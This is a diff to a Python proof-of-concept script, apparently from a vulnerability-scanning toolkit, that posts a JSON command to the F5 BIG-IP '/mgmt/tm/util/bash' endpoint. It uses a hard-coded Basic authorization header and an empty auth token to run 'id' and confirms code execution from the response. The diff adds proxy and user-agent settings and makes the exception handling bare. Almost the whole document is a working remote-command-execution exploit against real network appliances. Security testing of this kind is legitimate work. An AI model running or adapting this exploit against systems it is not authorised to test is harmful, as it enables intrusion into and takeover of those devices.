@@ -3,7 +3,10 @@
 
 import requests
 import json
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 
 # 脚本信息
 ######################################################
@@ -17,14 +20,14 @@ def poc(target):
     result = {}
     vuln_url = target + "/mgmt/tm/util/bash" 
     headers = {
+        "User-Agent": ua,
         "Authorization": "Basic YWRtaW46QVNhc1M=",
         "X-F5-Auth-Token": "",
         "Content-Type": "application/json"
     }
     data = '{"command":"run","utilCmdArgs":"-c id"}'
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5)
+        r = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5,proxies=proxies)
         if "commandResult" in r.text and r.status_code == 200:
             c = json.loads(r.text)["commandResult"]
             result['target'] = target
@@ -33,7 +36,7 @@ def poc(target):
             return result
         else:
             pass
-    except Exception as e:
+    except:
         pass
 
 
